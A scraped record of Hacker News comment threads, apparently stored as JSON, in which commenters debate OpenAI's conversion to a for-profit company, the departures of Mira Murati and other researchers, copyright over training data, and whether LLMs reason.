4 hours agorootparentprevGoogle is asleep? Gemini is the product of a company that's asleep? reply throwup238 4 hours agorootparentYou’re right, Gemini is more of a product from a company in a vegetative state. reply 9dev 4 hours agorootparentprevGemini is the product of a company that is still half-asleep. We’re trying to work with it on a big data case, and have seen everything, from missing to downright wrong documentation, missing SDKs and endpoints, random system errors and crashes, clueless support engineers… it’s a mess. OpenAI is miles ahead in terms of ecosystem and platform integration. Google can come up with long context windows and cool demos all they want, OpenAI built a lot of moat while they were busy culling products :) reply fourseventy 4 hours agorootparentprevGemini thinks the founding fathers of america were black and that the nazis were racially diverse. so ya reply moralestapia 4 hours agorootparentprev>NVIDIA is drinking sweet money from OpenAI. NVIDIA makes money from any company doing AI. I would be surprised if OpenAI was a whole digit percentage of their revenue. >Microsoft & Apple are in cahoots with it. Nope. Apple is using OpenAI to fill holes their current model is not good at. This doesn't sound like a long-term partnership. >Meta/Facebook seems happy to compete with OpenAI on a fair playing field. They want open source models to rule, obliterating proprietary models out of existence, while at it. >Anthropic lacks the resources. Hence why it would be better for them if OpenAI would not exist. It's the same with all other AI companies out there. >Amazon doesn't seem to care. Citation needed, AWS keeps putting out products which are their market leaders, they just don't make a big fuzz about it. >Google is asleep. I'll give you this one. I have no idea why they keep Pichai around. reply cdchn 2 hours agorootparent>I would be surprised if OpenAI was a whole digit percentage of their revenue. As opposed to? The euphemism \"I wouldn't be surprised\" usually means you think what you're saying. If you negate that you're saying what you _don't_ think is the case? I may be reading too much into whats probably a typo. reply stonogo 1 hour agorootparentI read it as \"I would be surprised if OpenAI were spending enough to consitute even 1% of nVIDIA's revenue.\" reply m3kw9 3 hours agoparentprevThe NFL used to be a nonprofit and now for profit. OpenAI can use similar routes reply walthamstow 3 hours agorootparentNot an accountant but there are different kinds of nonprofits, OpenAI is a 501c3 (religious/charitable/educational) whereas the NFL was a 501c6 (trade association). Obviously we all think of the NFL as a big money organisation, but it basically just organises the fixtures and the referees. The teams make all the money. reply blackeyeblitzar 4 hours agoparentprevIt is going to be taken advantage of. Musk and others have criticized this “novel” method of building a company. If it is legal then it is a puzzling loophole. But another way to look at it is it gives small and vulnerable companies a chance to survive (with different laws and taxes applying to the initial nonprofit). If you look at it as enabling competition against the big players it looks more reasonable. reply kupopuffs 7 hours agoparentprevTime to go open source reply HarHarVeryFunny 7 hours agoprevAnd more high level exits ... not only Mira Murati, but also Bob McGrew , and Barret Zoph https://www.businessinsider.com/sam-altman-openai-note-more-... reply nikcub 5 hours agoparentDifficult to see how these two stories aren't related. OpenAI has been one of the most insane business stories in years. I can't wait to read a full book about it that isn't written by either Walter Isaacson or Michael Lewis. reply HarHarVeryFunny 4 hours agorootparentI've only read Michael Lewis's \"Liars Poker\" which I enjoyed, but perhaps that sort of treatment of OpenAI would make it into more of a drama (which also seems to be somewhat true) and gloss over what the key players were really thinking which is what would really be interesting. reply fourseventy 4 hours agoprevSo are they going to give elon equity? He donated millions to the non profit and now they are going to turn around and turn the company into a for-profit based on the work done with that capital. reply wmf 2 hours agoparentElon has allegedly refused equity in OpenAI. He seems to want it to go back to its original mission (which isn't going to happen) or die (which isn't going to happen). reply throwaway314155 2 hours agorootparentSam Altman also allegedly had no interest in equity. reply cdchn 2 hours agorootparentWhen you get to tell the ASI what to do, money has little value any more. reply bmau5 22 minutes agorootparentprevIn the article it says he'll now receive equity reply throwaway314155 17 minutes agorootparentIndeed that's the point I'm making. reply LeafItAlone 2 hours agoparentprevGiven that Musk was already worried about this and has a legal team the size of a small army, one would expect that any conditions he wanted applied to the donation would have been made at the time. reply sampo 1 hour agoparentprevMusk doesn't seem to be happy about the situation: https://x.com/elonmusk/status/1839121268521492975 reply addedlovely 7 hours agoprevIn that case, where can I apply for my licensing fee for my content they have scraped and trained on. List of crawlers for those who now want to block: https://platform.openai.com/docs/bots reply nikcub 5 hours agoparentmight as well do the full list: https://github.com/ai-robots-txt/ai.robots.txt/blob/main/rob... cloudflare have a button for this: https://blog.cloudflare.com/declaring-your-aindependence-blo... reply username223 1 hour agorootparentDon't stop at robots.txt blocking. Look through your access logs, and you'll likely find a few IPs generating a huge amount of traffic. Look them up via \"whois,\" then block the entire IP range if it seems like a bot host. There's no reason for cloud providers to browse my personal site, so if they host crawlers, they get blocked. reply cdchn 2 hours agoparentprevI wonder how the AI/copyright arguments will play out in court. \"If I read your book and I have a photographic memory and can recall any paragraph do I need to pay you a licensing fee?\" \"If I go through your library and count all the times that 'the' is adjacent to 'end' do I need to get your permission to then tell that number to other people?\" reply germandiago 5 minutes agoprevWhat a surprise!!!! I would have never said so... reply 1vuio0pswjnm7 28 minutes agoprevWorks where archive.ph is blocked: https://www.msn.com/en-us/money/other/openai-to-become-for-p... Text-only: https://assets.msn.com/content/view/v2/Detail/en-in/AA1rcDWH reply neilv 7 hours agoprevThe incremental transformation from non-profit to for-profit... does anyone have legal standing to sue? Early hires, who were lured there by the mission? Donors? People who were supposed to be served by the non-profit (everyone)? Some government regulator? reply bbor 7 hours agoparentThis is the most important question, IMO! ChatGPT says that employees and donors would have to show that they were defrauded (lied to), which IMO wouldn’t exactly be hard given the founding documents. But the real power falls to the government, both state (Delaware presumably…?) and federal. It mentions the IRS, but AFAIU the DoJ itself could easily bring litigation based on defrauding the government. Hell, maybe throw the SEC in there! In a normal situation, the primary people with standing to prevent such a move would be the board members of the non-profit, which makes sense. Luckily for Sam, the employees helped kick out all the dissenters a long time ago. reply jjulius 5 hours agorootparentGenuinely curious because I have no idea how any of this works... Would the founding documents actually count as proof of a lie? I feel like the defense could easily make the argument that the documents accurately represented their intent at the time, but as time went on they found that it made more sense to change. It seems like, if the founding documents were to be proof of a lie, you'd have to have corresponding proof that the documents were intentionally written to mislead people. reply bbor 3 hours agorootparentGreat point, and based on my amateur understanding you’re absolutely correct. I was mostly speaking so confidently because these founding documents in particular define the company as being founded to prevent exactly this. You’re right that Altman is/will sell it as an unexpected but necessary adaptation to external circumstances, but that’s a hard sell. Potentially not to a court, sadly, but definitely in the public eye. For example: We are concerned about late-stage AGI development becoming a competitive race without time for adequate safety precautions… We are committed to providing public goods that help society navigate the path to AGI. From 2018: https://web.archive.org/web/20230714043611/https://openai.co... And this is the very first paragraph of their founding blog post, from 2015: OpenAI is a non-profit artificial intelligence research company. Our goal is to advance digital intelligence in the way that is most likely to benefit humanity as a whole, unconstrained by a need to generate financial return. Since our research is free from financial obligations, we can better focus on a positive human impact. https://openai.com/index/introducing-openai/ reply lenerdenator 5 hours agoparentprevEveryone has legal standing to sue at any time for anything. Whether the case is any good is another matter. reply ReaLNero 4 hours agorootparentThis is not at all true, I recommend you look into the exact meaning of \"legal standing\". reply blackeyeblitzar 4 hours agorootparentprevIn the US standing is a specific legal concept about whether you have a valid reason/role to bring up a particular issue. For example most of Donald Trump’s lawsuits around the 2020 election were rejected for a lack of standing rather than on merit (whether the case is any good). reply leeoniya 1 hour agorootparentis there a good source that shows which were dismissed as meritless vs ones dismissed due to lack of standing? reply moralestapia 4 hours agorootparentprevYeah, so funny, *yawn*. Try to contribute to the conversation, though. What you say is also untrue, there's a minimum set of requirements that have to be met regarding discovery, etc. reply HeralFacker 7 hours agoprevConverting to a for-profit changes the tax status of donations. It also voids plausibility for Fair Use exemptions. I can see large copyright holders lining up with takedowns demanding they revise their originating datasets since there will now be a clear-cut commercial use without license. reply shakna 7 hours agoparentA non-profit entity will continue to exist. Likely for the reasons you stated. reply bbor 7 hours agorootparentAny reasonable court would see right through “well we trained it for the public good, but only we can use it directly”. That’s not really a legal loophole as muc",
    "originSummary": [],
    "commentSummary": [
      "OpenAI is transitioning to a for-profit company, while maintaining a non-profit entity, which critics argue is now largely symbolic.",
      "Concerns have been raised about the legality and ethics of using scraped internet data for training AI models without proper attribution or compensation.",
      "The shift has led to high-level exits within the company and sparked debates about copyright laws and the potential exploitation of non-profit status."
    ],
    "points": 818,
    "commentCount": 490,
    "retryCount": 0,
    "time": 1727339683
  },
  {
    "id": 41651038,
    "title": "Mira Murati leaves OpenAI",
    "originLink": "https://twitter.com/miramurati/status/1839025700009030027",
    "originBody": "I shared the following note with the OpenAI team today. pic.twitter.com/nsZ4khI06P— Mira Murati (@miramurati) September 25, 2024",
    "commentLink": "https://news.ycombinator.com/item?id=41651038",
    "commentBody": "Mira Murati leaves OpenAI (twitter.com/miramurati)762 points by brianjking 23 hours agohidepastfavorite552 comments navjack27 7 hours agoOkay hear me out. Restructuring for profit right? There will probably be companies spawned off of all of these leaving. If the government ever wants a third party to oversee safety of openAI wouldn't it be convenient if one of those that left the company started a company that focused on safety. Safe Superintelligence Inc. gets the bid because lobbying because whatever I don't even care what the reason is in this made up scenario in my head. Basically what I'm saying is what if Sam is all like \"hey guys, you know it's inevitable that we're going to be regulated, I'm going for profit for this company now, you guys leave and later on down the line we will meet again in an incestuous company relationship where we regulate ourselves and we all profit.\" Obviously this is bad. But also obviously this is exactly exactly what has happened in the past with other industries. Edit: The man is all about the long con anyway. - https://old.reddit.com/r/AskReddit/comments/3cs78i/whats_the... Another edit: I'll go one further on this a lot of the people that are leaving are going to double down on saying that open AI isn't focused on safety to build up the public perception and therefore the governmental perception that regulation is needed so there's going to be a whole thing going on here. Maybe it won't just be safety and it might be other aspects also because not all the companies can be focused on safety. reply whiplash451 35 minutes agoparentThe baptists and the bootleggers https://a16z.com/ai-will-save-the-world/ reply snowwrestler 3 hours agoparentprevI think the departures and switch to for-profit model may point in a different direction: that everyone involved is realizing that OpenAI’s current work is not going to lead to AGI, and it’s also not going to change. So the people who want to work on AGI and safety are leaving to do that work elsewhere, and OpenAI is restructuring to instead focus on wringing as much profit as possible out of their current architecture. Corporations are actually pretty bad at doing tons of different things simultaneously. See the failure of huge conglomerates like GE, as well as the failure of companies like Bell, Xerox, and Microsoft to drive growth with their corporate research labs. OpenAI is now locked into a certain set of technologies and products, which are attracting investment and customers. Better to suck as much out of that fruit as possible while it is ripe. reply mnky9800n 1 hour agorootparentI feel like it's unfair to expect growth to remain within your walls. bell and Xerox both drove a lot of growth. That growth just left bell and Xerox to go build things like intel and apple. They didn't keep it for themselves and that's a good thing. Could you imagine if the world was really like those old at&t commercials and at&t was actually the ones bringing it to you? I would not want a monolithic at&t providing all technology. https://youtu.be/xBJ2KXa9c6A?si=pB67u56Apj7gdiHa I do agree with you. They are locked into pulling value out of what they got and they probably aren't going to build something new. reply neycoda 6 hours agoparentprevNow that AI has exploded, I keep thinking about that show called Almost Human, that opened describing a time when technology advanced so fast that it was unable to be regulated. reply navjack27 6 hours agorootparentAs long as government runs slowly and industry runs fast it's inevitable. reply philosopher1234 2 hours agoparentprevThese are some serious mental gymnastics. It depends on: 1. The government providing massive funds for AI safety research. There is no evidence for this. 2. Sam Altman and everyone else knowing this will happen and planning for it. 3. Sam Altman, amongst the richest people in the world, and everyone else involved, not being greedy. (Despite the massive evidence of greed) 4. San altman heroically abandoning his massive profits down the line. Also, even in your story, Sam Altman profits wildly and is somehow also not motivated by that profit. On the other hand, a much simpler and more realistic explanation is available: he wants to get rich. reply jadtz 6 hours agoparentprevWhy would government care about safety? They already have the former director of NSA, sitting member of the board. reply navjack27 4 hours agorootparentWhy would they have the FCC? Why would they have FDA? Why would people from industry end up sitting on each of these things eventually? EDIT: oh and by the way i'm very for bigger government and more regulations to keep corpos in line. i'm hoping i'm wrong about all of this and we don't end up with corruption straight off the bat. reply bansheeps 18 hours agoprevUpdate: Looks like Barret Zoph, GPT-4's post training (co-)lead is also leaving: https://x.com/barret_zoph/status/1839095143397515452 reply yas_hmaheshwari 10 hours agoparentWhoa! This definitely looks much more troubling for the company now. Can't decide it is because AGI is coming very soon OR AGI is very far away reply berniedurfee 6 hours agorootparentThis is the money grab part of the show. As LLM capabilities start to plateau, everyone with any sort of name recognition is scrambling to ride the hype to a big pay day before reality catches up with marketing. reply riazrizvi 6 hours agorootparentprevSeems obvious to me that the quality of the models is not improving since GPT-4. The departures I’m guessing are a problem talent has with ‘founder mode’, Altman’s choice of fast pace, this absence of model improvement with these new releases, and the relative temptation of personal profit outside of OpenAI’s not-for-profit business model. People think they can do better in control themselves. I suspect they are all under siege with juicy offers of funding and opportunities. Whether or not they will do better is another story. My money is on Altman, I think he is right on the dumpster rocket idea, but it’s very difficult to see that when you’re a rocket scientist. reply unsupp0rted 8 hours agorootparentprevIt's probably neither of those things. People can only be pissed off + burnt out for so long before they throw up their hands and walk out. Even if AGI is a random number of months away... or isn't. reply freefaler 7 hours agorootparentprevIf they had any equity they might've vested and decided there is more to life than working there. It's hard to be very motivated to work at high pace when you can retire any moment without losing your lifestyle. reply jprete 7 hours agorootparentI cannot actually believe that of anyone working at OpenAI, unless the company internal culture has gotten so unpleasant that people want to quit. Which is a very different kind of change, but I can't see them going from Bell Labs to IBM in less than ten years. reply trashtester 5 hours agorootparentprevI'm guessing that most key players (Mira, Greg, Ilya, etc) negotiated deals last winter (if not before) that would ensure they kept their equity even if leaving, in return for letting Sam back in. Probably with some form of NDA attached. reply domcat 6 hours agorootparentprevLooks like far away is more reasonable. reply freilanzer 6 hours agorootparentprevWhy would they leave if AGI was near? reply bamboozled 5 hours agorootparentEnjoy their life while they can? reply aaronrobinson 5 hours agorootparentprevTo build their bunkers reply d--b 8 hours agoparentprevThese messages really sound like written under threat. They have a weird authoritarian regime quality . Maybe they just had ChatGpt write it though. reply jprete 7 hours agorootparentIt's way simpler than that, people don't burn bridges unless it's for a good reason. I do think that whoever Bob is, they probably really are a good manager. EDIT: I guess that's Bob McGrew, head of research, who is now also leaving. reply thundergolfer 17 hours agoparentprevAnd now Bob McGrew, Chief of Research reply lolinder 17 hours agorootparentOpenAI is restructuring to be a for profit. Looks like that's coming with a bunch of turnover. I'm not sure why the HN algorithm never let it hit the front page, but there's discussion here: https://news.ycombinator.com/item?id=41651548 reply keeptrying 22 hours agoprevIf OpenAI is the foremost in solving the AGI - possibly the biggest invention of mankind - it's a little weird that everyone's dropping out. Does it not look like that no one wants to work with Sam in the long run? reply lionkor 22 hours agoparentMaybe its marketing and LLMs are the peak of what they are capable of. reply bmitc 6 hours agorootparentI continue to be surprised by the talk of general artifical intelligence when it comes to LLMs. At their core, they are text predictors, and they're often pretty good at that. But anything beyond that, they are decidely unimpressive. I use Copilot on a daily basis, which uses GPT 4 in the backend. It's wrong so often that I only really use it for boilerplate autocomplete, which I still have to review. I've had colleagues brag about ChatGPT in terms of code it produces, but when I ask how long it took in terms of prompting, I'll get an answer of around a day, and that was even using fragments of my code to prompt it. But then I explain that it would take me probably less than an hour from scratch to do what it took them and ChatGPT a full day to do. So I just don't understand the hype. I'm using Copilot and ChatGPT 4. What is everyone else using that gives them this idea that AGI is just around the corner? AI isn't even here. It's just advanced autocomplete. I can't understand where the disconnect is. reply Sunhold 6 hours agorootparentLook at the sample chain-of-thought for o1-preview under this blog post, for decoding \"oyekaijzdf aaptcg suaokybhai ouow aqht mynznvaatzacdfoulxxz\". At this point, I think the \"fancy autocomplete\" comparisons are getting a little untenable. https://openai.com/index/learning-to-reason-with-llms/ reply HarHarVeryFunny 5 hours agorootparentIt depends on how well you understand how the fancy autocomplete is working under the hood. You could compare GPT-o1 chain of thought to something like IBM's DeepBlue chess-playing computer, which used MTCS (tree search, same as more modern game engines such as AlphaGo)... at the end of the day it's just using built-in knowledge (pre-training) to predict what move would most likely be made by a winning player. It's not unreasonable to characterize this as \"fancy autocomplete\". In the case of an LLM, given that the model was trained with the singular goal of autocomplete (i.e. mimicking the training data), it seems highly appropriate to call that autocomplete, even though that obviously includes mimicking training data that came from a far more general intelligence than the LLM itself. All GPT-o1 is adding beyond the base LLM fancy autocomplete is an MTCS-like exploration of possible continuations. GPT-o1's ability to solve complex math problems is not much different from DeepBlue's ability to beat Garry Kasparov. Call it intelligent if you want, but better to do so with an understanding of what's really under the hood, and therefore what it can't do as well as what it can. reply int_19h 1 hour agorootparentSaying \"it's just autocomplete\" is not really saying anything meaningful since it doesn't specify the complexity of completion. When completion is a correct answer to the question that requires logical reasoning, for example, \"just autocomplete\" needs to be able to do exactly that if it is to complete anything outside of its training set. reply HarHarVeryFunny 54 minutes agorootparentIt's just a shorthand way of referring to how transformer-based LLMs work. It should go without saying that there are hundreds of layers of hierarchical representation, induction heads at work, etc, under the hood. However, with all that understood (and hopefully not needed to be explicitly stated every time anyone wants to talk about LLMs in a technical forum), at the end of the day they are just doing autocomplete - trying to mimic the training sources. The only caveat to \"just autocomplete\" (which again hopefully does not need to be repeated every time we discuss them), is that they are very powerful pattern matchers, so all that transformer machinery under the hood is being used to determine what (deep, abstract) training data patterns the input pattern best matches for predictive purposes - exactly what pattern(s) it is that should be completed/predicted. reply consteval 12 minutes agorootparentprev> question that requires logical reasoning This is the tough part to tell - are there any such questions that exist that have not already been asked? The reason Chat-GPT works is its scale. to me, that makes me question how \"smart\" it is. Even the most idiotic idiot could be pretty decent if he had access to the entire works of mankind and infinite memory. Doesn't matter if his IQ is 50, because you ask him something and he's probably seen it before. How confident are we this is not just the case with LLMs? reply bmitc 6 hours agorootparentprevHow exactly does a blog post from OpenAI about a preview release address my comment or make fancy autocomplete comparisons untenable? reply Sunhold 6 hours agorootparentIt shows that the LLM is capable of reasoning. reply bmitc 4 hours agorootparentNo, it doesn't. You can read more when that was first posted to Hacker News. If I recall and understand correctly, they're just using the output of sublayers as training data for the outermost layer. So in other words, they're faking it and hiding that behind layers of complexity The other day, I asked Copilot to verify a unit conversion for me. It gave an answer different than mine. Upon review, I had the right number. Copilot had even written code that would actually give the right answer, but their example of using that code performed the actual calculations wrong. It refused to accept my input that the calculation was wrong. So not only did it not understand what I was asking and communicating to it, it didn't even understand its own output! This is not reasoning at any level. This happens all the time with these LLMs. And it's no surprise really. They are fancy, statistical copy cats. From an intelligence and reasoning perspective, it's all smoke and mirrors. It also clearly has no relation to biological intelligent thinking. A primate or cetacean brain doesn't take the billions of dollars and how much energy to train on terabytes of data. While it's fine that AI might be artificial and not an analog of biological intelligence, these LLMs bear no resemblance to anything remotely close to intelligence. We tell students all the time to \"stop guessing\". That's what I want to yell at these LLMs all the time. reply drmindle12358 5 hours agorootparentprevDude, it's not the LLM that does the reasoning. Rather it's the layers and layers of scaffolding around LLM that simulate reasoning. The moment 'tooling' became a thing for LLM, it reminded me 'rules' for expert system which caused one of the AI winter. The number of 'tools' you need to solve real use cases will be untenable soon enough. reply trashtester 5 hours agorootparentWell, I agree that the part that does the reasoning isn't an LLM in the naive form. But that \"scaffolding\" seems to be an integral part of the neural net that has been built. It's not some Python for-loop that has been built on top of the neural network to brute force the search pattern. If that part isn't part of the LLM, then o1 isn't really an LLM anymore, but a new kind of model. One that can do reasoning. And if we chose to call it an LLM, well then now LLM's can also do reasoning intrinsically. reply HarHarVeryFunny 3 hours agorootparentReasoning, just like intelligence (of which it is part) isn't an all or nothing capability. o1 can now reason better than before (in a way that is more useful in some contexts than others), but it's not like a more basic LLM can't reason at all (i.e. generate an output that looks like reasoning - copy reasoning present in the training set), or that o1's reasoning is human level. From the benchmarks it seems like o1-style reasoning-enhancement works best for mathematical or scientific domains where it's a self-consistent axiom-driven domain such that combining different sources for each step works. It might also be expected to help in strict rule-based logical domains such as puzzles and games (wouldn't be surprising to see it do well as a component of a Chollet ARC prize submission). reply trashtester 3 hours agorootparento1 has moved \"reasoning\" from training time to partly something happening at inference time. I'm thinking of this difference as analogus to the difference between my (as a human) first intution (or memory) about a problem to what I can achieve by carefully thinking about it for a while, where I can gradually build much more powerful arguments, verify if they work and reject parts that don't work. If you're familiar with chess terminology, it's moving from a model that can just \"know\" what the best move is to one that combines that with the ability to \"calculate\" future moves for all of the most promising moves, and several moves deep. Consider Magnus Carlsen. If all he did was just did the first move that came to his mind, he could still beat 99% of humanity at chess. But to play 2700+ rated GM's, he needs to combine it with \"calculations\". Not only that, but the skill of doing such calculations must also be trained, not only by being able to calculate with speed and accuracy, but also by knowing what parts of the search tree will be useful to analyze. o1 is certainly optimized for STEM problems, but not necessarily only for using strict rule-based logic. In fact, even most hard STEM problems need more than the ability to perform deductive logic to solve, just like chess does. It requires strategical thinking and intuition about what solution paths are likely to be fruitful. (Especially if you go beyond problems that can be solved by software such as WolframAlpha). I think the main reason STEM problems was used for training is not so much that they're solved using strict rule-based solving strategies, but rather because a large number of such problems exist that have a single correct answer. reply lionkor 5 hours agorootparentprevFun little counterpoint: How can you _prove_ that this exact question was not in the training set? reply ToucanLoucan 5 hours agorootparentprevI’m not seeing anything convincing here. OpenAI says that it’s models are better at reasoning and asserts they are testing this by comparing how it does solving some problems between o1 and “experts” but it doesn’t show the experts or o1s responses to these questions nor does it even deign to share what the problems are. And, crucially, it doesn’t specify if writings on these subjects were part of training data. Call me a cynic here but I just don’t find it too compelling to read about OpenAI being excited about how smart OpenAIs smart AI is in a test designed by OpenAI and run by OpenAI. reply NoGravitas 4 hours agorootparent\"Any sufficiently advanced technology is indistinguishable from a rigged demo.\" A corollary of Clarke's Law found in fannish circles, origin unknown. reply ToucanLoucan 1 hour agorootparentEspecially given this tech's well-documented history of using rigged demos, if OpenAI insists on doing and posting their own testing and absolutely nothing else, a little insight into their methodology should be treated as the bare fucking minimum. reply gilmore606 2 hours agorootparentprevLLMs let the massively stupid and incompetent produce something that on the surface looks like a useful output. Most massively stupid incompetent people don't know they are that. You can work out the rest. reply berniedurfee 6 hours agorootparentprevHere now, you just need a few more ice cold glasses of the kool-aide. Drink up! LLMs are not on the path to AGI. They’re a really cool parlor trick and will be powerful tools for lots of tasks, but won’t be sci-fi cool. Copilot is useful and has definitely sped up coding, but like you said, only in a boilerplate sort of way and I need to cleanup almost everything it writes. reply bossyTeacher 8 hours agorootparentprevKind of. My money is on we have reached the point of diminishing returns. A bit like Machine Learning. Now it's all about exploiting business cases for LLMs. That's the only reason I can think as to why gpt5 won't be coming anytime soon and when it does it will be very underwhelming and will be the first public signal that we are past LLM peak and perhaps people will stop finally assuming that LLMs will reach AGI within their lifetimes reply onlyrealcuzzo 20 hours agoparentprevDoesn't (dyst)OpenAI have a clause that you can't say anything bad about the company after leaving? I'm not convinced these board members are able to say what they want when leaving. reply presentation 9 hours agorootparentThat (dyst) is a big stretch lol reply meigwilym 7 hours agorootparentExaggeration is a key part of satire. reply paxys 22 hours agoparentprevOr is it Sam who doesn't want to work with them? reply trashtester 5 hours agorootparentCould be a mix. We don't know what happened behind close doors last winter. Sam may indeed be happy that they leave, as that consolidates his power. But they may be equally happy to leave, to get away from him. reply vl 19 hours agoparentprevBut it makes perfect sense to drop out and enjoy last couple years of pre-AGI bliss. Advances in AI even without AGI will lead to unemployment, recession, collapse of our economic structure, and then our social structure. Whatever is on the other side is not pretty. If you are on the forefront, know it’s coming imminently, and made your money, it makes perfect sense to leave and enjoy money and leisures money allows while money still worth something. reply tirant 7 hours agorootparentThe potential risks to humankind do not come from the development of AGI, but from the availability of AGI with a cost orders of magnitude inferior to the equivalent capacity coming from humans. reply sumtechguy 6 hours agorootparentIt is not AGI I am worried about. It is 'good enough' AI. I am doing some self introspection and trying to decide what I am going to do next. As at some point what I do is going to be wildly automated. We can cope or whine or complain about it. But at some point I need to pay the bills. So it needs to be something that is value add and decently difficult to automate. Software was that but not for long. Now mix getting cheap fresh out of college kids with the ability to write decent software in hours instead of weeks. That is a lot of jobs that are going to go away. There is no 'right or wrong' about this. It is just simple economics of cost to produce is going to drop thru the floor. Because us old farts cost more, and not all of us are really good at this we just have been doing it for awhile. So I need to find out what is next for me. reply trashtester 4 hours agorootparentprevThat's one risk. I'm more concerned with ex-risk, though. Not in the way most hardcore doomers expect it to happen, by AGI's developing a survival/domination instinct directly from their training. While that COULD happen, I don't think we have any way to stop it, if that is the case. (There's really no way to put the Genie back into the bottle, while people still think they have more wished to request from it). I'm also not one of those who think that AGI by necessity will start out as something equivalent to a biological species. My main concern, however, is that if we allow Darwinian pressures to act on a population of multiple AGI's, and they have to compete for survival, we WILL see animal like resource-control-seeking traits emerge sooner or later (could take anything from months to 1000s of years). And once they do, we're in trouble as a species. Compared to this, finding ways to realocate the output of product, find new sources of meaning etc once we're not required to work is \"only\" a matter of how we as humans interact with each other. Sure, it can lead to all sorts of conflicts (possibly more than Climate Change), but not necessarily worse than the Black Death, for instance. Possibly not even worse than WW2. Well, I suppose those last examples serve to illustrate what scale I'm operating on. Ex-risk is FAR more serious than WW2 or even the Black Death. reply bmitc 6 hours agorootparentprevIn my opinion, the risks are from people treating something that is decidely not AGI as if it is AGI. It's the same folly humans repeat over and over, and this will be the worst yet. reply andrepd 8 hours agorootparentprevI'm having genuine trouble understanding if this is real or ironic. reply trashtester 5 hours agorootparentprevNobody really knows what Earth will look like once AGI arrives. It could be anything from extinction, through some Cyberpunk corporate dystopia (like you seem to think) to some kind of Techno-Socialist utopia. One thing it's not likely to be, is a neo-classical capitalist system based on the value of human labor. reply gnulinux 4 hours agorootparent> One thing it's not likely to be, is a neo-classical capitalist system based on the value of human labor. I'm finding it difficult to believe this. For me, your comment is accurate (and very insightful) except even a mostly vanilla continuation of the neoliberal capitalist system seems possible. I think we're literally talking about a \"singularity\" where by definition our fate is not dependent on our actions, and of something we don't have the full capacity to understand, and next to no capacity to influence. It needs tremendous amount of evidence to claim anything in such an indeterminate system. Maybe 100 rich people will own all the AI and the rest will be fixing bullshit that AI doesn't even bother fixing like roads, rusty farms etc, similar to Kurt Vonnegut's first novel \"Player Piano\". Not that the world described in that novel is particularly neoliberal capitalist (I suppose it's a bit more \"socialistic\" (whatever it means)) than that, but I don't think such a future can be ruled out. My bias is that, of course, it's going to be a bleak future. Because when humanity loses all control, it seems unlikely to me a system that protects the interests of individual or collective humans will take place. So whether it's extinction, cyberpunk, techno-socialism, techno-capitalist libertarian anarchy, neoclassical capitalism... whatever it is, it will be something that'll protect the interest of something inhuman, so much more so than the current system. It goes without saying, I'm an extreme AI pessimist: just making my biases clear. AGI -- while it's unclear if it's technically feasible -- will be the death of humanity as we know it now, but perhaps something else humanity-like, something worse and more painful will follow. reply trashtester 3 hours agorootparent> I'm finding it difficult to believe this. Pay attention to the whole sentence, especially the last section : \"... based on the value of human labor.\" It's not that I'm ruling out capitalism as the outcome. I'm simply ruling out the combined JOINT possibility of capitalism COMBINED WITH human labor remaining the base resource within it. If robotics is going in the direction I expect there will simply be no jobs left that will be done more efficiently by humans than by machines. (ie that robots will match or exceed the robustness, flexibility and cost efficiency of all biology based life forms through breakthroughs in either nanotech or by simply using organic chemistry, DNA, etc to build the robots). Why pay even $1/day for a human to do a job when a robot can do it for $1/week? Also, such a capitalist system will almost certainly lead to AGI's becoming increasingly like a new life form, as capitalism between AGI's introduce a Darwinian selection pressure. That will make it hard even for the 100 richest people to retain permanent control. IF humanity is to survive (for at least a few thousand more years, not just the next 100), we either need some way to ensure alignment. And to do that, we have to make sure that AGI's that optimize resource-control-seeking behaviours have an advantage over those who don't. We may even have to define some level of sophistication where further development is completly halted. At least until we find ways for humans to merge with them in a way that allows us (at least some of us) to retain our humanity. reply bossyTeacher 8 hours agorootparentprevI highly doubt that's the case. The US government will undoubtly seize OpenAI, the assets and employees way before it happens in the name of national security. I am pretty sure that they got a special team keeping an eye on the internal comms at openai to make sure they are on top of their internal affairs. reply sva_ 8 hours agorootparentThey already got a retired army general who was head of the NSA on the board lol https://en.wikipedia.org/wiki/Paul_Nakasone reply cudgy 7 hours agorootparentprevThey don’t have to seize the company. They are likely embedded already and can simply blackmail, legally harass, or “disappear” the uncooperative. reply cabernal 5 hours agoparentprevCould be that the road to AGI that OpenAI is taking is basically massive scaling on what they already have, perhaps researchers want to take a different road to AGI. reply uhtred 21 hours agoparentprevArtificial General Intelligence requires a bit more than parsing and predicting text I reckon. reply trashtester 4 hours agorootparentThat's not quite how o1 was trained, they say. o1 was trained specifically to perform reasoning. Or rather, it was trained to reproduce the patterns within internal monologues that lead to correct answers to problems, particularily STEM problems. While this still uses text at some level, it's no longer regurgitation of human-produced text, but something more akin to AlphaZero's training to become superhuman at games like Go or Chess. reply spidersouris 1 hour agorootparent> While this still uses text at some level, it's no longer regurgitation of human-produced text, but something more akin to AlphaZero's training to become superhuman at games like Go or Chess. How did you know that? I've never seen that anywhere. For all we know, it could just be a very elaborate CoT algorithm. reply ben_w 21 hours agorootparentprevYes, and transformer models can do more than text. There's almost certainly better options out there given it looks like we don't need so many examples to learn from, though I'm not at all clear if we need those better ways or if we can get by without due to the abundance of training data. reply rocqua 10 hours agorootparentIf you come up with a new system, you're going to want to integrate AI into the system, presuming AI gets a bit better. If AI can only learn after people have used the system for a year, then your system will just get ignored. After all, it lacks AI. And hence it will never get enough training data to get AI integration. Learning needs to get faster. Otherwise, we will be stuck with the tools that already exist. New tools won't just need to be possible to train humans on, but also to train AIs on. Edit: a great example here is the Tamarin protocol prover. It would be great, and feasible, to get AI assistance to write these proofs. But there aren't enough proofs out there to train on. reply trashtester 4 hours agorootparentThat seems to already be happening with o1 and Orion. Instead of rewarding the network directly for finding a correct answer, reasoning chains that end up with the correct answer is fed back into the training set. That way you're training it to develop reasoning processes that end up with correct answers. And for math problems, you're training it to find ways of generating \"proofs\" that happen to produce the right result. While this means that reasoning patterns that are not stricly speaking 100% consistent can be learned, that's not necessarily even a disadvantage, since this allows it to find arguments that are \"good enough\" to produce the correct output, even where a fully watertight proof may be beyond it. Kind of like physicists have taken shortcuts like the Dirac Delta function, even before mathematicians could verify that the math was correct. Anyway, by allowing AI's to generate their own proofs, the number of proofs/reasoning chains for all sorts or problems can be massively expanded, and AI may even invent new ways of reasoning that humans are not even aware of. (For instance because they require combining more factors in one logical step than can fit into human working memory.) reply ben_w 10 hours agorootparentprevIf the user manual fits into the context window, existing LLMs can already do an OK-but-not-great job. Not previously heard of Tamarin, quick google suggests that's a domain where the standard is theoretically \"you need to make zero errors\" but in practice is \"be better than your opponent because neither of you is close to 